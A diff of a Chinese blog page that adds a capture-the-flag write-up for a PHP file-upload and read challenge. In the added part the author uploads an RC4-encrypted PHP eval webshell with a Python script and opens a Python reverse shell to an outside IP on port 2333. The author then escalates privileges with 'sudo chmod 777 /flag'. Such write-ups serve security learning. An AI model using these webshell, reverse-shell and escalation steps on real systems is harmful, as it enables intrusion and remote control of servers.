@@ -21,8 +21,18 @@
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/333.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/334.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/335.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/336.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/337.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/338.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/339.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/341.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/342.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/343.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/344.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/345.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/346.png?raw=true">
 <meta property="article:published_time" content="2023-02-06T12:12:30.000Z">
-<meta property="article:modified_time" content="2023-02-06T12:15:51.367Z">
+<meta property="article:modified_time" content="2023-02-06T13:15:45.671Z">
 <meta property="article:author" content="草莓布丁">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/329.png?raw=true">
@@ -176,6 +186,62 @@
 <li>代码分析</li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_GET[&quot;a&quot;]==&quot;upload&quot;)&#123;</span><br><span class="line">    move_uploaded_file($_FILES[&#x27;file&#x27;][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES[&#x27;file&#x27;][&quot;name&quot;]);</span><br><span class="line">&#125;elseif ($_GET[&quot;a&quot;]==&quot;read&quot;) &#123;</span><br><span class="line">    echo file_get_contents($_GET[&quot;file&quot;]);</span><br><span class="line">&#125;elseif ($_GET[&quot;a&quot;]==&quot;version&quot;) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>（1）GET 上传 a 参数值为 upload，可以移动上传文件<br>
+（2）GET 上传 a 参数值为 read，file 参数值为可读权限的文件，就会将文件内容回显到页面中<br>
+（3）GET 上传 a 参数值为 version，查看 php 信息<br>
+ 2. 分析<br>
+（1）正常显示 index.php 文件内容<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/336.png?raw=true" alt><br>
+（2）利用参数 a 读取文件的方法读取 index.php 文件发现内容乱码。<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/337.png?raw=true" alt><br>
+3. 乱码分析<br>
+怀疑是对原文做了加密处理，应该是改了引擎。我们可以在 php.ini 文件中查找 extension 配置，看看加载了什么文件做了处理。<br>
+（1）获取 php.ini 文件位置<br>
+显然可以查看 phpinfo () 信息<br>
+利用参数 a<br>
+ 得到 php.ini 文件的位置	/usr/local/lib/php.ini<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/338.png?raw=true" alt><br>
+（2）查看 php.ini<br>
+；是注释，发现 zend_test 文件没被注释，注意看下面的一段话，<a target="_blank" rel="noopener" href="http://xn--xxx-x98dwoupjct91d7h5ahih4ybcz9r0ggclp.so">告诉我们这些文件要么是 xxx.so</a>，要么是 php_xxx.dll<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/339.png?raw=true" alt><br>
+（3）尝试在 extension 路径下读取 zend_test.so 文件成功<br>
+因为.so 文件结尾，可以尝试逆向（本人没尝试，直接查阅 wp）<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/341.png?raw=true" alt><br>
+逆向得到<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/342.png?raw=true" alt><br>
+（4）得到加密方式，尝试一句话木马上传文件，用蚁剑获取网站文件<br>
+加密方式：rc4<br>
+ 密钥：abcsdfadfjiweur<br>
+ 使用 python 写一句话木马保存为 shell.php 文件，加密上传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from Crypto.Cipher import ARC4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rc4_encrypt(data, key):</span><br><span class="line">    key = bytes(key, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">    enc = ARC4.new(key)</span><br><span class="line">    res = enc.encrypt(data.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    files = &#123;&#x27;file&#x27;: (&#x27;shell.php&#x27;, rc4_encrypt(&quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;, &quot;abcsdfadfjiweur&quot;), &#x27;text/plain&#x27;)&#125;</span><br><span class="line">    res = requests.post(url=&#x27;http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81?a=upload&#x27;,</span><br><span class="line">                        files=files)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>使用蚁剑连接<br>
+很可惜的是，翻烂了也没看到 flag<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/343.png?raw=true" alt></li>
+<li>反弹 shell<br>
+（1）搭建阿里云服务器<br>
+（2）安装 NC<br>
+ 详情：<a target="_blank" rel="noopener" href="https://xdym11235.com/archives/77.html">https://xdym11235.com/archives/77.html</a><br>
+yum install nmap-ncat<br>
+（3）启动 apache 服务<br>
+具体详看阿里云的新手指引<br>
+（4）在服务器安全组增加开启 2333 端口<br>
+（5）开启监听<br>
+ nc -lvp 2333<br>
+（6）利用 hackbar 插件反弹 shell（bur 也可，能发包就行）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd= system(&quot;python3 -c \&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;47.115.201.125&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;);</span><br></pre></td></tr></table></figure>
+<p>写你的服务器的公网 IP，和开启对应的端口<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/344.png?raw=true" alt><br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/345.png?raw=true" alt><br>
+ 5. 提权<br>
+原来比赛环境 flag 没有读的权限，需要提权操作，复现靶场可以，甚至我的蚁剑也可以查看，可能被人改了权限。<br>
+（1）sudo -l<br>
+ 提示 chmod<br>
+（2）chmod 的 sudo 提权方法<br>
+ sudo chmod 777 /flag<br>
+cat /flag<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/346.png?raw=true" alt></p>
 
       
     </div>
